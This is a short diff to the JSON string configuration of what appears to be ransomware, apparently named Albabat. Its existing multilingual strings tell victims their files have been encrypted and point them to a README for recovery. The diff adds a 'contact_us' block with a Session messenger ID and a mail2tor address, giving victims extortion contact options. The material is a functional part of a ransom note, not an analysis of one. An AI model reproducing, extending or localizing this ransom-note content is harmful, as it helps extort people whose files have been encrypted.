@@ -170,7 +170,13 @@
 		  "es": "Para conocer más detalles sobre lo sucedido y rescatar tus archivos, lee el archivo:",
 		  "fr": "Pour en savoir plus sur ce qui s'est passé et récupérer vos fichiers, lisez le fichier:",
 		  "ru": "Чтобы узнать больше подробностей о произошедшем и спасти свои файлы, прочитайте файл:"
-	  }
+	  },
+		"contact_us": {
+			"title": "Contact us:",
+			"opt1": "Option 1 - Download Session messenger (https://getsession.org/download), and add us with our ID: 05d103331ac293b1a0d3984b96a8435d46a5c01bc253307a9ccd75503aa9961a16",
+			"opt2": "Option 2 - Or, send us an email to: albabat@mail2tor.com",
+			"note": "Option 1 is most recommended. All this information is found in the 'README' file mentioned above."
+		}
     },
 		"note": {
 			"old_title": "Some of your files have been encrypted!",
